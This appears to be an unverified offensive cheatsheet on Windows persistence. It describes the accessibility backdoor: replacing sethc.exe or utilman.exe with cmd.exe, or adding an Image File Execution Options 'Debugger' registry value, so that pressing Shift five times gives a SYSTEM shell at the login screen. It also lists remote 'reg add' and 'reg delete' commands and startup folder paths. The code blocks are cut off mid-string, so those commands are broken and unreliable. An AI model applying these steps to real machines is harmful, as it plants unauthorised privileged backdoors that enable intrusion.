---
id: a0654ec3-0329-44c7-9752-b70153f1c1ed
name: Windows Persistance Cheatsheet
type: cheatsheet
verified: false
created_at: '2020-07-14T18:21:22.738542+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Windows Persistance Cheatsheet

# Description

Windows Persistence techniques





After replacing the sethc or utilman  commands:

> To invoke sethc press the Shift Key 5 times

> To invoke util man press the windows key + U





## SETHC Replacement Location

Replace this binary with cmd.exe



**Code**: [[%WINDIR%\System32\sethc.exe]]



## Utilman Replacement Location

Replace this binary with cmd.exe



**Code**: [[%WINDIR%\System32\utilman.exe]]





## Sethc / Utilman Non Persistent Debugger Keys

Navigate to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ Make key called “sethc.exe” Make a REG_SQ value called “Debugger” Assign it “c:\windows\system32\cmd.exe” as the value

Hit SHIFT 5 times and get a shell as nt authority\system



Add the sethc debugger registry key



**Code**: [[reg add "\\hostname\HKLM\Software\Microsoft\Window]]





Add the utilman debugger registry key



**Code**: [[reg add "\\hostname\HKLM\Software\Microsoft\Window]]





Remove the Sethc debugger registry key



**Code**: [[reg delete "\\hostname\HKLM\Software\Microsoft\Win]]





Remove the utilman debugger Registry key



**Code**: [[reg delete "\\hostname\HKLM\Software\Microsoft\Win]]





## 

## Startup Locations

Startup Folders Locations



**Code**: [[
#All Users - Windows XP
C:\Documents and Settings]]






